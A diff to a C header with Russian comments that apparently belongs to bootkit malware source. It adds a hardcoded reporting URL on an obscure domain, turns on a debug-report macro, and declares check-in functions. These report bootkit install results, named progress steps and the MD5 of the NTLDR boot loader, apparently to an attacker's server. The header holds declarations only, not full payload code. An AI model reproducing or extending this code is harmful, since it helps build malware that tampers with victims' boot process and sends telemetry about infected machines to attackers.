@@ -1,6 +1,16 @@
 #ifndef UUID_E4500F5134534F79A3663021D13CDBC8
 #define UUID_E4500F5134534F79A3663021D13CDBC8
 
+#define PP_REPORT_URL  "http://dgbsdfs.info/geter/index_.php"
+
+#define DBGRPT_ENABLED
+
+#ifdef DBGRPT_ENABLED
+#	define PP_DBGRPT_FUNCTION_CALL(function) { (function); };
+#else 
+#	define PP_DBGRPT_FUNCTION_CALL(function) __noop
+#endif
+
 // Ф-ция инициализации отправки сообщений
 void DebugReportInit();
 
@@ -12,6 +22,9 @@ void DebugReportBkInstallCode(DWORD BkInstallResult);
 
 // Отстук по именной контрольной точке
 void DebugReportStepByName(const char* StepName);
+
+void DebugReportStep1();
+void DebugReportStep2(DWORD BkInstallResult);
 
 // Отстук с информацией о MD5 файла NTLDR
 void DebugReportUpdateNtldrCheckSum();
